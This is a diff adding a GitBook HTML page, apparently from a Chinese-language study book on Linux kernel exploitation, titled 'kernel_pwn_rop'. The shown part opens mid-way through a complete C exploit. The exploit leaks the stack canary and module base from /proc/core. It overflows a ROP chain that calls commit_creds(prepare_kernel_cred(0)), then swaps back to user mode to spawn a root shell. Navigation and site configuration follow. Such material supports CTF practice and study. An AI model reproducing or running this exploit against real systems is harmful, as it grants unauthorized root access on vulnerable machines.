+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] prepare_kernel_cred===&gt;%p\n&quot;</span>,prepare_kernel_cred);
+    fclose(fd);
+}
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_root</span><span class="hljs-params">()</span>
+</span>{
+    <span class="hljs-keyword">char</span>* (*pkc)(<span class="hljs-keyword">int</span>) = prepare_kernel_cred;
+    <span class="hljs-keyword">void</span> (*cc)(<span class="hljs-keyword">char</span>*) = commit_creds;
+    (*cc)((*pkc)(<span class="hljs-number">0</span>));
+    <span class="hljs-comment">/* puts(&quot;[*] root now.&quot;); */</span>
+}
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    save_stats();
+    get_vmlinux_base();
+    <span class="hljs-keyword">int</span> fd;
+    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>,O_RDWR);
+    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span> ){
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Open /proc/core error!\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];
+    <span class="hljs-keyword">size_t</span> tmps[<span class="hljs-number">0x10</span>];
+    setoff(fd,<span class="hljs-number">0x40</span>);
+    core_read(fd,buf);
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i++){
+        tmps[i] = *(<span class="hljs-keyword">size_t</span> *)(&amp;buf[i*<span class="hljs-number">8</span>]);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] %p\n&quot;</span>,i,tmps[i]);
+    }
+    canary = tmps[<span class="hljs-number">0</span>];
+    module_base = tmps[<span class="hljs-number">2</span>]<span class="hljs-number">-0x19b</span>;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] canary===&gt;%p\n&quot;</span>,canary);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] module_base===&gt;%p\n&quot;</span>,module_base);
+    <span class="hljs-keyword">int</span> i = <span class="hljs-number">8</span>;
+    <span class="hljs-keyword">size_t</span> rop[<span class="hljs-number">0x20</span>];
+    rop[i++] = canary;
+    rop[i++] = <span class="hljs-number">0</span>;
+    rop[i++] = (<span class="hljs-keyword">size_t</span>)get_root;
+    rop[i++] = swapgs;<span class="hljs-comment">//swapgs; popfq; ret;</span>
+    rop[i++] = <span class="hljs-number">0</span>;
+    rop[i++] = iret;<span class="hljs-comment">// iretq; ret;</span>
+    rop[i++] = (<span class="hljs-keyword">size_t</span>)get_shell;
+    rop[i++] = user_cs;
+    rop[i++] = user_eflags;
+    rop[i++] = user_sp;
+    rop[i++] = user_ss;
+    write(fd,rop,<span class="hljs-number">0x100</span>);
+    core_copy_func(fd,<span class="hljs-number">0xf000000000000000</span>+<span class="hljs-number">0x100</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../c文件操作/c文件操作.html" class="navigation navigation-prev " aria-label="Previous page: c文件操作">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../linux_kernel保护机制/linux_kernel保护机制.html" class="navigation navigation-next " aria-label="Next page: linux_kernel保护机制">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"kernel_pwn_rop","level":"1.4.2","depth":2,"next":{"title":"linux_kernel保护机制","level":"1.4.3","depth":2,"path":"kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.md","ref":"kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.md","articles":[]},"previous":{"title":"c文件操作","level":"1.4.1","depth":2,"path":"kernel_pwn/c文件操作/c文件操作.md","ref":"kernel_pwn/c文件操作/c文件操作.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-sharing","sharing-plus","-search","search-pro","code","expandable-chapters","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"search-pro":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","qq","linkedin","qzone","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"TTY","lang":"zh-cn","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Gitbook电子书","gitbook":"*","description":"Gitbook电子书示例项目"},"file":{"path":"kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.md","mtime":"2021-03-17T13:36:16.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-12-04T09:49:46.732Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
